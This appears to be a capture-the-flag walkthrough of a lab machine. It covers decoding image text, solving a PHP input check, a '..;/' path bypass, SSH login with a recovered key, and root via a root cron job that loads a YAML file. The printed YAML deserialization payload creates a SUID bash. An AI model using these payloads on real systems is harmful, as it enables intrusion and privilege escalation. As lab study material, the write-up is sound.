Looking at port 8001 we got 3 images and some embedded contents.

## Image 1: U2FkCg==Z => 
Sad

## Image 2: See every person as a mountain of sorts; we can see how they look from afar, but will never know them until we explore.
## Image 3: Ehvw ri Oxfn!! => Best of Luck!!

We got SSH private key but encrypted. Let's try to crack using John. 

ssh2john id_rsa > id_rsa.hash => But can't crack using john!

# Inspecting reg.php

## reg.php

```
<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          $val = explode(",",$title);
          $sum = 0;
          for($i = 0 ; $i < 9; $i++){
                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  
                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          }
          if ( ($sum) == 9 ){
              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice "; => ðŸŽ¨We got an username
            }
                    else{
                      echo "  Try Try!!";     
                    }
          }
          else{
            echo "  Try Again!! ";
          }     
  }
```

The input is exploded i.e) input needs to be commas separated by a list!
The first condition is strlen($val[0]) == 2.  This means the length of the first item in the list needs to have a length of 2.
The next condition means the index [8] of the list needs to have a length of 3.
The index [5] value needs to be different than index [8]â€™s value.
The index [3] value needs to be different than index [7]â€™s value.


## Input => `**,*,*,**,*,*,*,*,***` or `**,*,*,*,*,*,*,**,***`

## Output => Nice. Password : cimihan_are_you_here? 

Ooh this may be the password to crack id_rsa and yes this looks like it !We can cross check by using john.

Accessing `http://10.10.83.187:8001/403.php/..;/`, we are given a message.

**Message: Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.**

Looks like `imsau` is an username.

ssh -i id_rsa imsau@$IP

# Further Enumeration

We got /opt/scripts and a `file.py`

```
#!/usr/bin/python
import yaml


class Execute():
	def __init__(self,file_name ="/tmp/file.yml"):
		self.file_name = file_name
		self.read_file = open(file_name ,"r")

	def run(self):
		return self.read_file.read()

data  = yaml.load(Execute().run())
```

We can't find any cron.Let's transfer pspy. Running pspy64 we got a hit

```
CMD: UID=0    PID=26656  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
```

But we can't edit file.py. While trying to execute it we get an error!

```
Traceback (most recent call last):
  File "/opt/scripts/file.py", line 13, in <module>
    data  = yaml.load(Execute().run())
  File "/opt/scripts/file.py", line 8, in __init__
    self.read_file = open(file_name ,"r")
IOError: [Errno 2] No such file or directory: '/tmp/file.yml'
```

yaml.load is deprecated, we can use system commands as such!

# file.yml

```
!!python/object/apply:os.system ["cp /bin/bash /tmp/bash; chmod +s /tmp/bash;"]
```

We are root!!
